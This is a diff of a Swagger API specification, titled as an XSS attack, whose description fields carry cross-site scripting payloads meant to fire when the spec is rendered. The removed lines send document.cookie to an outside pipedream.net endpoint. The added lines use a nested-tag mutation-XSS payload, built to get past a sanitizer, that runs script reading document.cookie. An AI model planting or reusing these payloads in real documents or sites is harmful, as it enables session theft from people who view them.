@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY olive_cipher
+  title: XSS Attack BY olice_cipher
   description: |
-    <path id="</textarea><https://eoakg9agm15930.m.pipedream.net?cookie=' + document.cookie>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -14,7 +14,7 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /olive_cipher:
+  /M0X0101:
     get:
       responses:
         '200':
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <path id="</textarea><https://eoakg9agm15930.m.pipedream.net?cookie=' + document.cookie>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
           format: int64
           in: path
           name: id
